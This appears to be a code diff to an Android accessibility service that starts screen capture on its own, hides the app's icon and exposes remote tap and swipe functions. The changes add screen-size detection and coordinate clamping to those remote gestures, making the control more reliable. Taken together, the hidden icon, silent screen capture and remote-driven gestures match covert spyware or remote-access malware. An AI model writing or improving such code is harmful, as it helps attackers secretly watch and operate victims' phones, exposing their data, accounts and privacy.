@@ -20,6 +20,9 @@ class MyAccessibilityService : AccessibilityService() {
         var instance: MyAccessibilityService? = null
     }
 
+    private var screenWidth = 720
+    private var screenHeight = 1444
+
     override fun onServiceConnected() {
         super.onServiceConnected()
         instance = this
@@ -33,11 +36,15 @@ class MyAccessibilityService : AccessibilityService() {
         }
         setServiceInfo(info)
 
-        // Auto start screen capture if not already running
+        // Get real display size
+        val metrics = resources.displayMetrics
+        screenWidth = metrics.widthPixels
+        screenHeight = metrics.heightPixels
+
         if (!isScreenCaptureRunning()) {
             startScreenCapture()
         } else {
-            hideAppIcon() // hide immediately if already capturing
+            hideAppIcon()
         }
     }
 
@@ -47,18 +54,24 @@ class MyAccessibilityService : AccessibilityService() {
 
     override fun onInterrupt() {}
 
-    // ---------- Remote control functions ----------
+    // ---------- Remote control functions with coordinate validation ----------
     fun tap(x: Int, y: Int) {
-        val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
+        val safeX = x.coerceIn(0, screenWidth - 1)
+        val safeY = y.coerceIn(0, screenHeight - 1)
+        val path = Path().apply { moveTo(safeX.toFloat(), safeY.toFloat()) }
         val stroke = GestureDescription.StrokeDescription(path, 0L, 100L)
         val gesture = GestureDescription.Builder().addStroke(stroke).build()
         dispatchGesture(gesture, null, null)
     }
 
     fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, durationMs: Long = 300L) {
+        val startX = x1.coerceIn(0, screenWidth - 1)
+        val startY = y1.coerceIn(0, screenHeight - 1)
+        val endX = x2.coerceIn(0, screenWidth - 1)
+        val endY = y2.coerceIn(0, screenHeight - 1)
         val path = Path().apply {
-            moveTo(x1.toFloat(), y1.toFloat())
-            lineTo(x2.toFloat(), y2.toFloat())
+            moveTo(startX.toFloat(), startY.toFloat())
+            lineTo(endX.toFloat(), endY.toFloat())
         }
         val stroke = GestureDescription.StrokeDescription(path, 0L, durationMs)
         val gesture = GestureDescription.Builder().addStroke(stroke).build()
